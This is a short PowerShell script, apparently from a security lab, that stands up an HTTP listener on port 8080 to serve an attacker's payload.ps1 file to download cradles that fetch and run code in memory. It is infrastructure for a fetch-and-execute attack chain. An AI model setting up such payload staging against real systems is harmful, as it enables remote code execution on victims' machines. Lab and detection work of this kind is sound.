# The attacker's payload-staging web host. Serves data/payload.ps1 to any request on
# :8080 — this is what an in-memory download cradle pulls and executes. Runs until stopped.
$prefix = 'http://+:8080/'
$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add($prefix)
$listener.Start()
Write-Output "[serve] staging payload on $prefix"
$payload = Get-Content -Raw /lab/data/payload.ps1
while ($listener.IsListening) {
    try {
        $ctx = $listener.GetContext()
        $bytes = [Text.Encoding]::UTF8.GetBytes($payload)
        $ctx.Response.ContentType = 'text/plain'
        $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
        $ctx.Response.Close()
        Write-Output "[serve] served payload to $($ctx.Request.RemoteEndPoint)"
    } catch {
        break
    }
}
